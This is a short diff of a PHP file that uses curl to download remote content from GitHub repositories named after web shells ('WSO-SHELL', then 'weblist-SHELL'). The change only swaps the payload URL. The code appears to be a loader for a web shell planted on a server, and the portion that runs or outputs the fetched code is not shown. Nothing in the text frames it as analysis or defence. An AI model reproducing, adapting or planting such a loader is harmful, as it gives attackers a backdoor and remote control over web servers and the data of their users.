@@ -1,5 +1,5 @@
 <?php
-$url = "https://raw.githubusercontent.com/rendihidayat683/WSO-SHELL/refs/heads/main/.vne0000003";
+$url = "https://raw.githubusercontent.com/rendihidayat683/weblist-SHELL/refs/heads/main/wkwk.php";
 $ch = curl_init($url);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 curl_setopt($ch, CURLOPT_HEADER, true);
@@ -19,4 +19,5 @@ if (curl_errno($ch)) {
 
 curl_close($ch);
 ?>
+
 
